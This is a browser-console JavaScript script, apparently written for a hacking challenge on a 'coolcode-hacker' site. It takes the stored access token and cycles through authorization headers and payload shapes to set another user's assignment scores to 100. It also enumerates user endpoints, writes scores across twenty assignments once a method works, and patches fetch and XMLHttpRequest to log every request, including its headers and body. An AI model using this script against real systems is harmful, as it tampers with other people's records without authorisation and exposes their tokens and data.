// CoolCode Bearer Token Investigation
// The Bearer token got a 500 error instead of 403, suggesting it's the right auth method
// Let's investigate what's causing the 500 error

console.log("🎯 Investigating Bearer Token 500 Error...");

const token = localStorage.getItem('ACCESS_TOKEN');
const baseUrl = "https://coolcode-hacker-34c5455cd908.herokuapp.com";
const targetUser = "98ixul";

// Decode the token
const decoded = JSON.parse(atob(token));
console.log("🔓 Token contents:", decoded);

// Test different variations of the Bearer token format
async function testBearerVariations() {
    console.log("\n🔍 Testing Bearer token variations...");
    
    const apiUrl = `${baseUrl}/api/api/assignment/score`;
    const basePayload = {
        username: targetUser,
        assignmentId: 1,
        score: 100
    };
    
    const variations = [
        {
            name: "Raw token as Bearer",
            headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' }
        },
        {
            name: "Username from token as Bearer",
            headers: { 'Authorization': `Bearer ${decoded.username}`, 'Content-Type': 'application/json' }
        },
        {
            name: "Hash from token as Bearer", 
            headers: { 'Authorization': `Bearer ${decoded.hash}`, 'Content-Type': 'application/json' }
        },
        {
            name: "Both ACCESS_TOKEN and Bearer",
            headers: { 
                'ACCESS_TOKEN': token,
                'Authorization': `Bearer ${token}`, 
                'Content-Type': 'application/json' 
            }
        },
        {
            name: "Bearer + additional headers",
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': 'application/json'
            }
        }
    ];
    
    for (const variation of variations) {
        try {
            console.log(`\nTesting: ${variation.name}`);
            
            const response = await fetch(apiUrl, {
                method: 'POST',
                headers: variation.headers,
                body: JSON.stringify(basePayload)
            });
            
            const responseText = await response.text();
            console.log(`   Status: ${response.status}`);
            console.log(`   Response: ${responseText}`);
            
            if (response.ok) {
                console.log(`   ✅ SUCCESS!`);
                return { variation, response: responseText };
            } else if (response.status === 500) {
                // 500 might mean we're close - let's try different payloads
                console.log(`   🔧 500 error - trying different payloads...`);
                await tryDifferentPayloads(apiUrl, variation.headers);
            }
            
        } catch (error) {
            console.log(`   ❌ Error: ${error.message}`);
        }
        
        await new Promise(resolve => setTimeout(resolve, 200));
    }
    
    return null;
}

// If we get 500, try different payload formats
async function tryDifferentPayloads(apiUrl, headers) {
    const payloadVariations = [
        {
            name: "String assignmentId",
            payload: { username: targetUser, assignmentId: "1", score: 100 }
        },
        {
            name: "String score",
            payload: { username: targetUser, assignmentId: 1, score: "100" }
        },
        {
            name: "Both strings",
            payload: { username: targetUser, assignmentId: "1", score: "100" }
        },
        {
            name: "With user_id",
            payload: { username: targetUser, user_id: targetUser, assignmentId: 1, score: 100 }
        },
        {
            name: "With assignment_id (snake_case)",
            payload: { username: targetUser, assignment_id: 1, score: 100 }
        },
        {
            name: "Minimal payload",
            payload: { assignmentId: 1, score: 100 }
        },
        {
            name: "With token in payload",
            payload: { username: targetUser, assignmentId: 1, score: 100, token: token }
        },
        {
            name: "Array format",
            payload: [{username: targetUser, assignmentId: 1, score: 100}]
        }
    ];
    
    for (const variation of payloadVariations) {
        try {
            const response = await fetch(apiUrl, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(variation.payload)
            });
            
            const responseText = await response.text();
            console.log(`     ${variation.name}: ${response.status} - ${responseText.substring(0, 100)}`);
            
            if (response.ok) {
                console.log(`     ✅ SUCCESS with ${variation.name}!`);
                return { payload: variation.payload, response: responseText };
            }
            
        } catch (error) {
            console.log(`     ${variation.name}: Error - ${error.message}`);
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    return null;
}

// Test if we can use our own user (CX8de3ce71-3cbTY) instead of 98ixul
async function testWithOwnUser() {
    console.log("\n🔄 Testing with our own user instead of 98ixul...");
    
    const apiUrl = `${baseUrl}/api/api/assignment/score`;
    const ownUserPayload = {
        username: decoded.username, // Use our own username
        assignmentId: 1,
        score: 100
    };
    
    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Authorization': `Bearer ${token}`,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(ownUserPayload)
        });
        
        const responseText = await response.text();
        console.log(`   Own user test: ${response.status} - ${responseText}`);
        
        if (response.ok) {
            console.log(`   ✅ SUCCESS! We can update our own scores`);
            return true;
        }
        
    } catch (error) {
        console.log(`   Error: ${error.message}`);
    }
    
    return false;
}

// Check if there are any other users we can test with
async function findOtherUsers() {
    console.log("\n👥 Looking for other users we might have access to...");
    
    const userEndpoints = [
        `${baseUrl}/api/users`,
        `${baseUrl}/api/students`,
        `${baseUrl}/ui/api/users`,
        `${baseUrl}/ui/api/students`
    ];
    
    for (const endpoint of userEndpoints) {
        try {
            const response = await fetch(endpoint, {
                headers: {
                    'Authorization': `Bearer ${token}`,
                    'ACCESS_TOKEN': token
                }
            });
            
            if (response.ok) {
                const data = await response.text();
                if (!data.includes('<!doctype html>')) {
                    console.log(`✅ Found users endpoint: ${endpoint}`);
                    console.log(`   Data: ${data.substring(0, 300)}...`);
                    
                    try {
                        const json = JSON.parse(data);
                        if (Array.isArray(json)) {
                            console.log(`   Found ${json.length} users`);
                            return json;
                        }
                    } catch (e) {
                        // Not JSON
                    }
                }
            }
        } catch (error) {
            // Ignore
        }
        
        await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    return null;
}

// Main execution
async function runBearerInvestigation() {
    console.log("🚀 Starting Bearer token investigation...");
    
    // Test our own user first
    const ownUserSuccess = await testWithOwnUser();
    
    // Look for other users
    const users = await findOtherUsers();
    
    // Test Bearer variations
    const bearerResult = await testBearerVariations();
    
    if (bearerResult) {
        console.log("\n🎉 FOUND WORKING METHOD!");
        console.log("Headers:", bearerResult.variation.headers);
        console.log("Response:", bearerResult.response);
        
        // Test with all assignments for 98ixul
        console.log("\n🔄 Testing all assignments for 98ixul...");
        const workingHeaders = bearerResult.variation.headers;
        
        for (let i = 1; i <= 20; i++) {
            try {
                const response = await fetch(`${baseUrl}/api/api/assignment/score`, {
                    method: 'POST',
                    headers: workingHeaders,
                    body: JSON.stringify({
                        username: targetUser,
                        assignmentId: i,
                        score: 100
                    })
                });
                
                const responseText = await response.text();
                console.log(`Assignment ${i}: ${response.status} - ${responseText.substring(0, 50)}`);
                
            } catch (error) {
                console.log(`Assignment ${i}: Error - ${error.message}`);
            }
            
            await new Promise(resolve => setTimeout(resolve, 200));
        }
        
    } else {
        console.log("\n😞 Still no working method found.");
        console.log("\n💡 Final suggestions:");
        console.log("1. The API might require admin/teacher privileges");
        console.log("2. Score updates might be restricted to the user's own scores");
        console.log("3. There might be a different API endpoint entirely");
        console.log("4. The challenge might be designed to be unsolvable via API");
        
        console.log("\n🔍 Let's try network monitoring...");
        console.log("Run: monitorNetworkForScoreUpdates()");
        console.log("Then try to manually navigate the UI to see if there's a score update interface");
    }
    
    return {
        ownUserSuccess,
        users,
        bearerResult
    };
}

// Run the investigation
runBearerInvestigation().then(results => {
    console.log("\n🎯 Bearer Investigation Complete!");
    console.log("📋 Results:", results);
    window.bearerResults = results;
});

// Make network monitoring available
window.startNetworkMonitoring = function() {
    console.log("🔍 Starting comprehensive network monitoring...");
    
    let allRequests = [];
    
    // Intercept fetch
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const [url, options] = args;
        allRequests.push({
            type: 'fetch',
            url: url,
            method: options?.method || 'GET',
            headers: options?.headers || {},
            body: options?.body,
            timestamp: new Date().toISOString()
        });
        
        console.log(`🌐 FETCH: ${options?.method || 'GET'} ${url}`);
        if (options?.body) {
            console.log(`   Body: ${options.body}`);
        }
        if (options?.headers) {
            console.log(`   Headers:`, options.headers);
        }
        
        return originalFetch.apply(this, args);
    };
    
    // Intercept XMLHttpRequest
    const originalXHR = window.XMLHttpRequest;
    window.XMLHttpRequest = function() {
        const xhr = new originalXHR();
        const originalOpen = xhr.open;
        const originalSend = xhr.send;
        
        xhr.open = function(method, url, ...args) {
            this._method = method;
            this._url = url;
            return originalOpen.apply(this, [method, url, ...args]);
        };
        
        xhr.send = function(body) {
            allRequests.push({
                type: 'xhr',
                url: this._url,
                method: this._method,
                body: body,
                timestamp: new Date().toISOString()
            });
            
            console.log(`🌐 XHR: ${this._method} ${this._url}`);
            if (body) {
                console.log(`   Body: ${body}`);
            }
            
            return originalSend.apply(this, [body]);
        };
        
        return xhr;
    };
    
    window.stopNetworkMonitoring = function() {
        window.fetch = originalFetch;
        window.XMLHttpRequest = originalXHR;
        console.log("🛑 Network monitoring stopped");
        console.log("📊 All requests captured:", allRequests);
        return allRequests;
    };
    
    console.log("✅ Comprehensive network monitoring active");
    console.log("💡 Now navigate the CoolCode UI and try to find any score-related interfaces");
    console.log("🛑 Use stopNetworkMonitoring() when done");
    
    return allRequests;
};
